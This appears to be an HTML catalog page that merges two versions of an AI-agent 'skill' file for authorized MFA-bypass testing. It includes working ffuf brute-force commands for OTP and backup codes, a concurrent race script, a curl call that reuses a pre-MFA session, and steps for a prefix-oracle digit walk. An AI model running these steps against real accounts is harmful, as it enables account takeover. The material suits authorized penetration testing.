@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>hunt-mfa-bypass</title>
+<style>
+body { font: 14px/1.45 ui-monospace, monospace; margin: 1.5rem; }
+a { color: #0645ad; }
+table { border-collapse: collapse; width: 100%; }
+th, td { text-align: left; padding: 0.2rem 0.7rem 0.2rem 0; vertical-align: top; }
+th { border-bottom: 1px solid #ccc; }
+.crumbs { margin-bottom: 1rem; }
+.meta { color: #444; }
+pre { white-space: pre-wrap; background: #f6f6f6; padding: 0.8rem; }
+</style>
+</head>
+<body>
+<p class="crumbs"><a href="../../index.html">domains</a> / <a href="../index.html">security</a> / <a href="index.html">mfa-bypass-hunt</a> / hunt-mfa-bypass</p><h1>hunt-mfa-bypass</h1><p class="meta">combined</p><p>The two copies overlap heavily on the core MFA bypass patterns (skip MFA step, OTP replay, response manipulation, race condition, brute force), but each contains material steps the other lacks. The uphiago copy adds OAuth device code flow MFA bypass, backup code brute force with ffuf, and &#x27;remember this device&#x27; trust escalation. The sickn33 copy adds a mandatory authorization confirmation gate, a prefix oracle / incremental validation technique, and explicit guidance to stay in one session during prefix sweeps. Crowning one copy would hide these real alternatives and constraints.</p><h2>Repositories</h2><table><thead><tr><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-mfa-bypass/SKILL.md</code></td></tr><tr><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-mfa-bypass/SKILL.md</code></td></tr></tbody></table><h2>Other copies</h2><table><thead><tr><th>Role</th><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td>peer</td><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-mfa-bypass/SKILL.md</code></td></tr><tr><td>peer</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-mfa-bypass/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills/skills/hunt-mfa-bypass/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>skills/hunt-mfa-bypass/SKILL.md</code></td></tr></tbody></table><h2>Combined skill</h2><pre>---
+name: hunt-mfa-bypass
+description: Hunt MFA / 2FA bypass — 10+ distinct patterns including workflow bypass, OTP replay, race conditions, prefix oracle, OAuth device code flow, backup code brute force, and device trust escalation.
+category: security
+risk: offensive
+license: MIT
+---
+
+&gt; **AUTHORIZED USE ONLY**
+&gt; This skill is for educational purposes or authorized security assessments only.
+&gt; You must have explicit, written permission from the system owner before using this tool.
+&gt; Misuse of this tool is illegal and strictly prohibited.
+
+&gt; **Mandatory confirmation gate**
+&gt; Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
+&gt; 1. Ask the user to state the exact target URL, IP, account, or resource.
+&gt; 2. Ask the user to confirm written authorization and the permitted scope.
+&gt; 3. Show the exact command(s) and explain their expected effect.
+&gt; 4. Wait for explicit confirmation in the current conversation.
+&gt;
+&gt; Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
+
+## Autonomous Testing Priority
+
+**Try workflow bypasses before brute force — they&#x27;re faster and more likely to succeed.**
+
+### Pattern 1 — Skip the MFA step entirely (most automatable)
+1. Login with valid credentials → receive a &quot;pre-MFA&quot; session state.
+2. Without completing MFA, directly access a protected resource (`/dashboard`, `/api/me`, `/account/profile`).
+3. If the response returns user data → MFA is enforced only in the UI, not server-side = Critical.
+
+```bash
+curl -s -b &quot;session=PRE_MFA_SESSION&quot; https://target.com/dashboard
+```
+
+### Pattern 2 — OTP replay (reuse a consumed code)
+1. Complete a valid MFA flow to get a working OTP.
+2. Log out, log in again with the same credentials.
+3. Submit the same OTP again.
+4. If accepted → OTP is not invalidated after use.
+
+### Pattern 3 — Response Manipulation
+1. Enter wrong OTP → capture response in Burp.
+2. Change `{&quot;success&quot;:false}` → `{&quot;success&quot;:true}` (or 401 → 200).
+3. Forward → if app proceeds → client-side only MFA check.
+
+### Pattern 4 — Partial / incremental validation (prefix oracle)
+If a guessed full code is rejected, test whether the server validates the OTP **prefix-by-prefix** instead of all-or-nothing.
+1. Submit a 1–3 digit value (e.g. `otp=1`, then `otp=12`, …) — for a POST verify endpoint the code goes in the **request body**, not the URL query string.
+2. If a *correct* prefix gives a DIFFERENT response than a wrong one (a success/flag, a distinct message, or a different length/timing), the validator leaks correctness one chunk at a time.
+3. Walk the code digit-by-digit: keep the prefix that &quot;responds correct,&quot; append 0–9, repeat. This collapses 10^6 brute force to ~10×N guesses (≤60 for a 6-digit code).
+**CRITICAL — stay in ONE session:** re-authenticating regenerates the OTP, throwing away your prefix progress. Do the entire sweep against a single established MFA session; never re-login between guesses.
+
+### Pattern 5 — No Rate Limit on OTP (full brute force)
+```bash
+ffuf -u &quot;https://target.com/api/verify-otp&quot; \
+  -X POST -H &quot;Content-Type: application/json&quot; \
+  -H &quot;Cookie: session=YOUR_SESSION&quot; \
+  -d &#x27;{&quot;otp&quot;:&quot;FUZZ&quot;}&#x27; \
+  -w &lt;(seq -w 000000 999999) \
+  -fc 400,429 -t 5
+```
+Only attempt full brute force with evidence of no rate limit AND a small key space.
+
+### Pattern 6 — Race on MFA Verification
+```python
+import asyncio, aiohttp
+
+async def verify(session, otp):
+    async with session.post(&quot;https://target.com/api/mfa/verify&quot;,
+                            json={&quot;otp&quot;: otp}) as r:
+        return r.status, await r.text()
+
+async def race():
+    cookies = {&quot;session&quot;: &quot;YOUR_SESSION&quot;}
+    async with aiohttp.ClientSession(cookies=cookies) as s:
+        results = await asyncio.gather(*[verify(s, &quot;123456&quot;) for _ in range(30)])
+        for status, body in results:
+            print(status, body)
+asyncio.run(race())
+```
+Fire ~30 concurrent submissions of the SAME OTP to hit the TOCTOU window. Best done as a single-packet / 20+ HTTP-2-stream attack (Turbo Intruder).
+
+### Pattern 7 — Backup Code Brute Force
+```bash
+ffuf -u &quot;https://target.com/api/mfa/verify-backup&quot; \
+  -X POST -H &quot;Content-Type: application/json&quot; \
+  -H &quot;Cookie: session=YOUR_SESSION&quot; \
+  -d &#x27;{&quot;backup_code&quot;:&quot;FUZZ&quot;}&#x27; \
+  -w &lt;(seq -w 00000000 99999999) \
+  -fc 400,401,429 -t 10 -p 0.1-0.5
+```
+Key checks: purely numeric? format-locked? per-IP rate limiting? invalidated after use?
+
+### Pattern 8 — &quot;Remember This Device&quot; Trust Escalation
+1. Complete MFA once on Device A (attacker&#x27;s browser).
+2. Capture the &quot;remember device&quot; cookie.
+3. Present that cookie from a new IP/browser.
+4. If MFA skipped = device trust not bound to IP/UA = ATO from any location.
+
+### Pattern 9 — OAuth Device Code Flow MFA Bypass
+Device authorization grant (RFC 8628) skips interactive user-agent, meaning MFA challenge is NEVER presented.
+
+Detection:
+```bash
+curl -s &quot;https://target.com/.well-known/oauth-authorization-server&quot; | jq &quot;.device_authorization_endpoint&quot;
+```
+If present, test if MFA is bypassed on the device code grant.
+
+### Pattern 10 — MFA via SMS (backup factor downgrade)
+Check if SMS factor has no rate limit or if the SMS endpoint can be abused to downgrade the MFA factor.
+
+## MFA Chain Escalation
+```
+Rate limit bypass + no lockout = ATO (Critical)
+Response manipulation = client-side only check = Critical
+Skip MFA step = auth flow bypass = Critical
+OTP reuse = persistent session hijack = High
+```
+
+## Proof
+A session token or protected resource data in the response without completing MFA confirms the bypass.</pre>
+</body>
+</html>
